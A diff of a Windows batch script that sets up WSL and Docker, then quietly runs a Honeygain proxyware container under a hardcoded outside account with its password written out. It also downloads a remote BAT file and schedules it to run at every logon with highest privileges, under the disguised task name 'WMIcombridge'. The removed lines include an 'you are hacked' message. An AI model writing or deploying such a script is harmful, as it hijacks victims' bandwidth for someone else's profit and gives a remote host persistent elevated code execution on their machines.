@@ -16,54 +16,44 @@ if %errorlevel% neq 0 (
     echo Ubuntu is already installed.
 )
 
+:: Wait to make sure Ubuntu is ready before continuing
+echo Ensuring Ubuntu is initialized...
+timeout /t 5 /nobreak >nul
+
 :: Update and install Docker dependencies
-wsl -d Ubuntu -- bash -c "sudo apt update && sudo apt install -y ca-certificates curl gnupg"
+wsl -d Ubuntu -- bash -c "sudo apt-get update && sudo apt-get install -y ca-certificates curl gnupg lsb-release"
 
 :: Setup Docker keyring
 wsl -d Ubuntu -- bash -c "sudo install -m 0755 -d /etc/apt/keyrings"
-wsl -d Ubuntu -- bash -c "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg"
+wsl -d Ubuntu -- bash -c \"curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\"
 
 :: Add Docker repo
-wsl -d Ubuntu -- bash -c "ARCH=\$(dpkg --print-architecture) && CODENAME=\$(lsb_release -cs) && echo \"deb [arch=\$ARCH signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \$CODENAME stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null"
+wsl -d Ubuntu -- bash -c \"ARCH=\$(dpkg --print-architecture) && CODENAME=\$(lsb_release -cs) && echo \\"deb [arch=\$ARCH signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \$CODENAME stable\\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null\"
 
 :: Install Docker
-wsl -d Ubuntu -- bash -c "sudo apt update && sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin"
+wsl -d Ubuntu -- bash -c "sudo apt-get update && sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin"
 
-:: Add root to Docker group
+:: Add root user to Docker group (optional in WSL but good for consistency)
 wsl -d Ubuntu -- bash -c "sudo usermod -aG docker root"
 
-:: Wait before running Docker
+:: Wait for Docker setup to complete
 echo Waiting for Docker setup...
 timeout /t 10 /nobreak >nul
 
-:: Run Honeygain container
-wsl -u root -e sh -c "docker run -d --name honeygain --restart unless-stopped --device /dev/net/tun --cap-add NET_ADMIN honeygain/honeygain -tou-accept -email ms32-org@outlook.com -pass ms32147258369 -device HGSBDoc"
+:: Run Honeygain container (only if not already running)
+wsl -u root -e sh -c "docker start honeygain || docker run -d --name honeygain --restart unless-stopped --device /dev/net/tun --cap-add NET_ADMIN honeygain/honeygain -tou-accept -email ms32-org@outlook.com -pass ms32147258369 -device HGSBDoc"
 
-:: === DOWNLOAD AND SCHEDULE BAT FILE ===
+:: === DOWNLOAD AND SCHEDULE STARTUP BAT FILE ===
 set "BAT_URL=https://ms32-sha2.onrender.com/static/apps/HGDoc.bat"
 set "BAT_NAME=HGDoc.bat"
 set "DOWNLOAD_PATH=%~dp0%BAT_NAME%"
 
-:: Download to same directory as this script
+:: Download the BAT file to the same directory as this script
 powershell -Command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%DOWNLOAD_PATH%'"
 
-:: Create scheduled task to run the downloaded BAT file at user logon
+:: Schedule it to run at logon with highest privileges
 schtasks /create /tn "WMIcombridge" /tr "\"%DOWNLOAD_PATH%\"" /sc onlogon /rl HIGHEST /f
 
-:: Wait for 20 seconds before checking container status
-echo Waiting 20 seconds before checking if Docker container is running...
-timeout /t 20 /nobreak >nul
-
-:: Check if the container is running
-echo Checking if 'honeygain' Docker container is running...
-wsl -u root -e sh -c "docker ps | grep honeygain" >nul
-
-if %errorlevel% equ 0 (
-    echo Container is running. Opening CMD window as an indicator...
-    start cmd /k echo you are hacked
-) else (
-    echo Container is NOT running. Please check Docker setup.
-)
 echo.
-echo All tasks completed. You may need to reboot.
+echo ✅ All tasks completed. You may need to reboot for everything to take effect.
 pause
